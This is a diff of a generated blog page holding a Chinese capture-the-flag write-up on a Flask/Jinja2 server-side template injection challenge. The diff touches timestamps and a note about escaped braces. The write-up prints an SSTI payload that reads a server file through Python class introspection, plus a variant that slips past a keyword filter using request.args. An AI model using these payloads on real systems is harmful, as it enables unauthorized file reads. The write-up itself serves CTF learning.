@@ -28,7 +28,7 @@
 <meta property="og:image" content="https://github.com/HANqd/IMG/raw/master/img/20190317/76.PNG">
 <meta property="og:image" content="https://github.com/HANqd/IMG/raw/master/img/20190317/77.PNG">
 <meta property="og:image" content="https://github.com/HANqd/IMG/raw/master/img/20190317/78.PNG">
-<meta property="og:updated_time" content="2019-04-21T13:45:11.357Z">
+<meta property="og:updated_time" content="2019-04-21T13:49:41.949Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="oj Web-Confusion1(SSTI攻击)">
 <meta name="twitter:description" content="Confusion1题目描述打开网址，就给了一个图片，看这个图片好像是个蛇缠着一个大象（貌似是这样）。">
@@ -323,7 +323,7 @@
 <ol start="3">
 <li>看了网上的wp，知道这是一个SSTI类型的题目<br>404页面 + Python 很容易就联想到 Flask jinja injection(SSTI)</li>
 <li>这里是另一种注入，对于新手来说，又增加了知识点，不能仅限于解题，得把原理及题目思路搞懂才行。</li>
-<li>读flag文件命令：<br><code>&amp;#123;&amp;#123;&#39;&#39;.__class__.__mro__[2].__subclasses__()[40](&#39;/opt/flag_1234qwerty.txt&#39;).read()&amp;#125;&amp;#125;</code>，出现如下，考虑是把class、mro、subclasses、read给过滤了。<br><img src="https://github.com/HANqd/IMG/raw/master/img/20190317/75.PNG" alt><br>多次测试，确实过滤了以上字符<br><img src="https://github.com/HANqd/IMG/raw/master/img/20190317/76.PNG" alt><br><img src="https://github.com/HANqd/IMG/raw/master/img/20190317/77.PNG" alt></li>
+<li>读flag文件命令：<br><code>&amp;#123;&amp;#123;&#39;&#39;.__class__.__mro__[2].__subclasses__()[40](&#39;/opt/flag_1234qwerty.txt&#39;).read()&amp;#125;&amp;#125;</code>，（注：’&#123;’表示左大括号，’&#125;’是右大括号，hexo在部署博客时，遇到大括号会出错。）出现如下，考虑是把class、mro、subclasses、read给过滤了。<br><img src="https://github.com/HANqd/IMG/raw/master/img/20190317/75.PNG" alt><br>多次测试，确实过滤了以上字符<br><img src="https://github.com/HANqd/IMG/raw/master/img/20190317/76.PNG" alt><br><img src="https://github.com/HANqd/IMG/raw/master/img/20190317/77.PNG" alt></li>
 <li>用request.args进行绕过，让上边那四个当成参数返回。request.args是flask中的一个属性,为返回请求的参数。<br>以上命令改为：<br><code>&amp;#123;&amp;#123;&#39;&#39;[request.args.a][request.args.b][2][request.args.c]()[40](&#39;/opt/flag_1234qwerty.txt&#39;)[request.args.d]()&amp;#125;&amp;#125;?a=__class__&amp;b=__mro__&amp;c=__subclasses__&amp;d=read</code></li>
 <li>最后在404界面得到flag。</li>
 </ol>
@@ -358,7 +358,7 @@
         <p><span>本文标题:</span><a href="/2019/04/21/oj web confusion1/">oj Web-Confusion1(SSTI攻击)</a></p>
         <p><span>文章作者:</span><a href="/" title="回到主页">HANqd</a></p>
         <p><span>发布时间:</span>2019-04-21, 21:29:12</p>
-        <p><span>最后更新:</span>2019-04-21, 21:45:11</p>
+        <p><span>最后更新:</span>2019-04-21, 21:49:41</p>
         <p>
             <span>原始链接:</span><a class="post-url" href="/2019/04/21/oj web confusion1/" title="oj Web-Confusion1(SSTI攻击)">https://hanqd.github.io/2019/04/21/oj web confusion1/</a>
             <span class="copy-path" data-clipboard-text="原文: https://hanqd.github.io/2019/04/21/oj web confusion1/　　作者: HANqd" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
